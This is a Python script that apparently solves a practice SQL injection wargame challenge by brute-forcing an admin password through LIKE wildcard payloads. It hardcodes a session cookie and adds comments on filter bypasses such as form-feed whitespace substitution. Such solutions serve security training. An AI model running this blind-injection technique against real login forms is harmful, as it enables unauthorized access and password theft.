#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
parameter = 'pw'
cookie = dict(PHPSESSID='e65uev8hnti7n47a7qe5auesel')

# select 1234 from{$_GET[shit]}prob_giant where 1

# page feed FF 0xc can also work to bypass the whitespace filter

# underscore matches one letter
# percent symbol is a wild card

common = ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&\'()*+,-./:;<=>?@[\\]^`{|}~')
passwd = '90'

known = '90d2fe10'

for j in range(8 - len(passwd)):
    for letter in common:

        sqli = "{}%".format(passwd + letter)

        query_url = "%s?%s=%s" % (url,parameter,sqli)

        print("[*]URL: %s" % query_url)
    
        http_request=requests.get(query_url,cookies=cookie)
        res = bs(http_request.text,"html.parser")

        if 'Hello admin' in res.text:
            passwd += letter 
            print("[*] password : {}".format(passwd))
            break 

        elif letter in common[-1]:
            print('password: %s' % passwd)
            exit(1) 